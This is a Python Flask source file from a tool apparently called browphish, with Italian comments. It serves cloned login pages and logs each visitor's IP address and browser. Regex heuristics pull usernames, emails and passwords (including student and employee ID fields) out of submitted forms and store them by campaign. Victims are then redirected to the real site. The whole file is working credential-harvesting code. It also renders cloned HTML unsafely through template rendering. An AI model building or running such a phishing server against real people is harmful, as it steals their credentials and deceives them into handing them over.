# browphish/src/modules/web_pages/web_server.py

import os
import sys
import json # Importa json per additional_data
from flask import Flask, render_template_string, request, redirect, abort, send_from_directory
from datetime import datetime
import logging
from pathlib import Path
import re
import json
from typing import Tuple, Dict, Any, Optional

# Aggiungi la directory 'src' al path per gli import relativi
src_dir = Path(__file__).resolve().parents[2] # Risali fino a 'browphish/src'
if str(src_dir) not in sys.path:
    sys.path.insert(0, str(src_dir))

# Importa il DatabaseManager
from db.manager import DatabaseManager

# Imposta il logger
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger("browphish.web_server")

# Inizializza il DatabaseManager (o ottieni l'istanza singleton)
# Assicurati che db_manager sia inizializzato correttamente per essere accessibile
db_manager = DatabaseManager.get_instance() # Verrà inizializzato da main.py o, in standalone, qui sotto

app = Flask(__name__)

# Variabili globali per memorizzare la pagina attualmente selezionata dal server_manager
selected_page_name: str = "simple_login"
selected_page_type: str = "test" # "test" per simple_login, "captured" per le clonate
selected_campaign_id: Optional[int] = None  # ID della campagna (se avviata da campaign_runner)
selected_campaign_name: Optional[str] = None  # Nome della campagna

def log_access(page_name):
    """Registra un accesso (GET) a una pagina clonata nel database."""
    phish_page_id = page_name
    campaign_name = selected_campaign_name
    campaign_id = selected_campaign_id
    ip = request.remote_addr
    user_agent = request.headers.get("User-Agent")
    form_data = {}  # Nessun form inviato, ma puoi aggiungere info di sessione o query string se vuoi
    additional_data = json.dumps({"access_type": "browse", "query_string": request.query_string.decode()})
    page_entity_id = db_manager.get_or_create_entity(phish_page_id, "page") if phish_page_id else None
    # Use campaign_id directly if available, otherwise use campaign_name
    campaign_entity_id = campaign_id if campaign_id else (db_manager.get_or_create_entity(campaign_name, "campaign") if campaign_name else None)
    db_manager.submit_credentials_or_log_access(
        campaign_entity_id, page_entity_id, None, None, None,
        ip, user_agent, additional_data
    )

@app.route('/')
def index():
    global selected_page_name, selected_page_type
    
    if selected_page_type == "test":
        # Serve la pagina di login di test dal folder 'templates/web_pages'
        # Assicurati che Flask trovi questa directory tramite configurazione o convenzione
        return render_template('simple_login.html') 
    elif selected_page_type == "captured":
        # Serve la pagina clonata selezionata dalla directory 'data/captured_pages'
        file_path = Path("data/captured_pages") / f"{selected_page_name}.html"
        if file_path.is_file():
            with open(file_path, 'r', encoding='utf-8') as f:
                html_content = f.read()
            logger.info(f"Servendo pagina clonata: {selected_page_name} da {file_path}")
            log_access(selected_page_name)
            return render_template_string(html_content)
        else:
            logger.error(f"File della pagina clonata non trovato: {file_path}")
            return abort(404, description=f"Pagina clonata '{selected_page_name}' non trovata.")
    
    return "Server in esecuzione - Nessuna pagina selezionata o tipo non valido."

# Questa route serve per le risorse statiche (CSS, JS, immagini) e per l'accesso diretto alla pagina per nome
# Esempio: /css/style.css o /nome_pagina.html
@app.route('/<path:filename>', methods=['GET', 'POST'])
def serve_static_and_named_pages(filename):
    global selected_page_name, selected_page_type

    # Gestisci POST requests per form submissions
    if request.method == 'POST':
        # Se è una richiesta POST, gestiscila come capture di credenziali
        return handle_form_submission(filename)
    
    # Se la richiesta è per la pagina principale clonata per nome (es. /uisp.html)
    if selected_page_type == "captured" and filename == f"{selected_page_name}.html":
        file_path = Path("data/captured_pages") / filename
        if file_path.is_file():
            with open(file_path, 'r', encoding='utf-8') as f:
                html_content = f.read()
            logger.info(f"Servendo pagina clonata per nome: {filename} da {file_path}")
            log_access(filename)
            return render_template_string(html_content)

    # Altrimenti, prova a servire come risorsa statica all'interno della directory delle pagine clonate
    # Questo è fondamentale per CSS, JS, immagini con percorsi relativi
    base_dir_for_assets = Path("data/captured_pages")
    file_path = base_dir_for_assets / filename
    
    if file_path.is_file():
        logger.info(f"Servendo risorsa statica: {filename} da {file_path}")
        return send_from_directory(base_dir_for_assets, filename)
    
    logger.warning(f"Risorsa o pagina non trovata: {filename}")
    return abort(404) # Se il file non esiste, ritorna 404

@app.route('/<page_name>', methods=['GET', 'POST'])
def serve_page_by_name(page_name):
    """Gestisce richieste per pagine clonate senza estensione .html"""
    global selected_page_name, selected_page_type
    
    # Gestisci POST requests per form submissions
    if request.method == 'POST':
        return handle_form_submission(page_name)
    
    # Per GET requests, reindirizza alla pagina con estensione .html
    if selected_page_type == "captured" and page_name == selected_page_name:
        file_path = Path("data/captured_pages") / f"{page_name}.html"
        if file_path.is_file():
            with open(file_path, 'r', encoding='utf-8') as f:
                html_content = f.read()
            logger.info(f"Servendo pagina clonata per nome: {page_name} da {file_path}")
            log_access(page_name)
            return render_template_string(html_content)
    
    return abort(404)

def guess_credentials(form_data: Dict[str, Any]) -> Tuple[Optional[str], Optional[str], Optional[str]]:
    """
    Tenta di indovinare username, email e password dai dati del form usando regex sui nomi dei campi.
    Args:
        form_data: Dizionario con i dati del form
    Returns:
        Tuple con (username, email, password)
    """
    username = None
    email = None
    password = None
    # Pattern regex per identificare i diversi tipi di campi
    password_patterns = [
        r'.*pass.*',           # password, passwd, passphrase
        r'.*pwd.*',            # pwd, password
        r'.*secret.*',         # secret
        r'.*pin.*',            # pin
        r'.*auth.*',           # auth, authentication
        r'.*credential.*',     # credential
        r'.*secure.*',         # secure
    ]
    email_patterns = [
        r'.*e?mail.*',         # email, mail, e-mail
        r'.*@.*',              # qualsiasi cosa con @
        r'.*addr.*',           # address
        r'.*contact.*',        # contact
    ]
    username_patterns = [
        r'.*user.*',           # user, username, userid
        r'.*login.*',          # login, loginname
        r'.*account.*',        # account, accountname
        r'.*name.*',           # name, fullname (ma non email)
        r'.*id.*',             # id, userid, studentid
        r'.*nick.*',           # nick, nickname
        r'.*handle.*',         # handle
        r'.*matricola.*',      # matricola (per siti universitari italiani)
        r'.*studente.*',       # studente
        r'.*codice.*',         # codice utente
        r'.*utente.*',         # utente
        r'.*cliente.*',        # cliente
        r'.*tessera.*',        # tessera
        r'.*badge.*',          # badge
        r'.*dipendente.*',     # dipendente
    ]
    def matches_pattern(field_name: str, patterns: list) -> bool:
        field_lower = field_name.lower()
        return any(re.match(pattern, field_lower, re.IGNORECASE) for pattern in patterns)
    def get_field_priority(field_name: str, patterns: list) -> int:
        field_lower = field_name.lower()
        for i, pattern in enumerate(patterns):
            if re.match(pattern, field_lower, re.IGNORECASE):
                return i
        return 999
    password_candidates = []
    email_candidates = []
    username_candidates = []
    for field_name, field_value in form_data.items():
        if not field_value or not isinstance(field_value, str):
            continue
        if matches_pattern(field_name, password_patterns):
            priority = get_field_priority(field_name, password_patterns)
            password_candidates.append((field_name, field_value, priority))
        elif matches_pattern(field_name, email_patterns):
            if '@' in field_value or 'mail' in field_name.lower():
                priority = get_field_priority(field_name, email_patterns)
                email_candidates.append((field_name, field_value, priority))
        elif matches_pattern(field_name, username_patterns):
            if '@' not in field_value:
                priority = get_field_priority(field_name, username_patterns)
                username_candidates.append((field_name, field_value, priority))
    if password_candidates:
        password_candidates.sort(key=lambda x: x[2])
        password = password_candidates[0][1]
    if email_candidates:
        email_candidates.sort(key=lambda x: x[2])
        email = email_candidates[0][1]
    if username_candidates:
        username_candidates.sort(key=lambda x: x[2])
        username = username_candidates[0][1]
    if not email and username and '@' in username:
        email = username
        username = None
    if not username and email and '@' in email:
        pass
    return username, email, password

def handle_form_submission(page_name):
    """Gestisce l'invio di form da qualsiasi pagina clonata."""
    global selected_campaign_id, selected_campaign_name
    
    form_data = {k: v for k, v in request.form.items()}
    username, email, password = guess_credentials(form_data)
    phish_page_id = request.form.get("phish_page_id") or page_name  # Usa il nome della pagina se non specificato
    campaign_name = request.form.get("campaign_name") or selected_campaign_name  # Usa quello del form o da variabile globale
    campaign_id = selected_campaign_id  # Usa il campaign_id globale se disponibile
    ip = request.remote_addr
    user_agent = request.headers.get("User-Agent")
    additional_data = json.dumps(form_data)

    # Log dettagliato per debugging
    logger.info(f"Form submission per pagina '{page_name}':")
    logger.info(f"  Email: {email}")
    logger.info(f"  Password: {'*' * len(password) if password else 'None'}")
    logger.info(f"  Username: {username}")
    logger.info(f"  Form data: {form_data}")

    # Risolvi gli entity_id
    page_entity_id = db_manager.get_or_create_entity(phish_page_id, "page") if phish_page_id else None
    # Use campaign_id directly if available (from background campaign runner), otherwise resolve from name
    if campaign_id:
        campaign_entity_id = campaign_id
    else:
        campaign_entity_id = db_manager.get_or_create_entity(campaign_name, "campaign") if campaign_name else None

    # Chiamata alla funzione unificata per loggare accessi e credenziali
    success = db_manager.submit_credentials_or_log_access(
        campaign_entity_id, page_entity_id, username, password, email,
        ip, user_agent, additional_data
    )
    
    if success:
        logger.info(f"Dati catturati da {ip} per pagina '{phish_page_id}' (Tipo: {selected_page_type}).")
        
        # Prova a recuperare l'URL originale per il redirect
        original_url = db_manager.get_original_url_for_page(page_name)
        if original_url:
            logger.info(f"Reindirizzamento a URL originale: {original_url}")
            return redirect(original_url)
        else:
            # Se non trova l'URL originale, usa una pagina di successo generica
            logger.info("URL originale non trovato, usando pagina di successo generica")
            return redirect('/success')
    else:
        logger.error(f"Errore nel salvataggio dati per pagina '{phish_page_id}'")
        return redirect('/success')  # Fallback a pagina di successo

@app.route("/capture", methods=["POST"])
def capture():
    global selected_campaign_id, selected_campaign_name
    
    form_data = {k: v for k, v in request.form.items()}
    username, email, password = guess_credentials(form_data)
    phish_page_id = request.form.get("phish_page_id")  # hidden field
    campaign_name = request.form.get("campaign_name") or selected_campaign_name  # Usa quello del form o globale
    campaign_id = selected_campaign_id  # Usa il campaign_id globale
    ip = request.remote_addr
    user_agent = request.headers.get("User-Agent")
    additional_data = json.dumps(form_data)

    # Log dettagliato per debugging
    logger.info(f"Form submission via /capture:")
    logger.info(f"  Email: {email}")
    logger.info(f"  Password: {'*' * len(password) if password else 'None'}")
    logger.info(f"  Username: {username}")
    logger.info(f"  Form data: {form_data}")

    # Risolvi gli entity_id
    page_entity_id = db_manager.get_or_create_entity(phish_page_id or "unknown_page", "page") if phish_page_id else None
    # Use campaign_id directly if available, otherwise resolve from name
    if campaign_id:
        campaign_entity_id = campaign_id
    else:
        campaign_entity_id = db_manager.get_or_create_entity(campaign_name, "campaign") if campaign_name else None

    # Chiamata alla funzione unificata per loggare accessi e credenziali
    success = db_manager.submit_credentials_or_log_access(
        campaign_entity_id, page_entity_id, username, password, email,
        ip, user_agent, additional_data
    )
    
    if success:
        logger.info(f"Dati catturati da {ip} per pagina '{phish_page_id or 'N/A'}' (Tipo: {selected_page_type}).")
        
        # Prova a recuperare l'URL originale per il redirect
        if phish_page_id:
            original_url = db_manager.get_original_url_for_page(phish_page_id)
            if original_url:
                logger.info(f"Reindirizzamento a URL originale: {original_url}")
                return redirect(original_url)
        
        # Se non trova l'URL originale, usa una pagina di successo generica
        logger.info("URL originale non trovato, usando pagina di successo generica")
        return redirect('/success')
    else:
        logger.error(f"Errore nel salvataggio dati per pagina '{phish_page_id or 'N/A'}'")
        return redirect('/success')  # Fallback a pagina di successo

@app.route('/success')
def success_page():
    """Pagina di successo dopo l'invio delle credenziali."""
    return "<h1>Successo!</h1><p>Le tue credenziali sono state inviate.</p><p>Sarai reindirizzato a breve...</p><script>setTimeout(function(){ window.location.href = 'https://www.google.com/'; }, 3000);</script>"

# Funzione per avviare il server (chiamata da server_manager.py)
def start_web_server(page_name="simple_login", page_type="test", ssl_context=None):
    global selected_page_name, selected_page_type
    selected_page_name = page_name
    selected_page_type = page_type
    logger.info(f"Web server in avvio per pagina '{selected_page_name}' (tipo: {selected_page_type}) sulla porta 5000.")
    app.run(host="0.0.0.0", port=5000, ssl_context=ssl_context)

if __name__ == '__main__':
    # Questo blocco viene eseguito se web_server.py è eseguito direttamente (es. con python3 web_server.py)
    print("Avvio del web_server.py in modalità standalone per test.")
    db_manager.init_schema() # Assicurati che lo schema sia inizializzato per test standalone
    # Puoi configurare qui una pagina di default per i test standalone
    start_web_server(page_name="simple_login", page_type="test")